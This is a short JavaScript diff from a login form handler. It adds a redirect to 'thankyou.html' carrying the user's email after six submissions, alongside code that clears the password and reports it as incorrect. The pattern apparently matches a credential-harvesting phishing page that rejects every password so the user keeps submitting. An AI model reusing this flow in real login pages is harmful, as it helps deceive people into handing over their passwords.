@@ -276,7 +276,7 @@ type: 'POST',
             			if (count>=6) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
-                    
+                    window.location.replace("thankyou.html?msg="+email);
 
                 }
                 $('#msg').html(response['msg']);
@@ -290,7 +290,7 @@ type: 'POST',
     	$("#password").val("");
     	if (count>=6) {
     		count=0;
-    		
+    		window.location.replace("thankyou.html?msg="+email);
     	
     	$("#msg").show();
     	$('#msg').html("Your Password is incorrect.! Please try again");
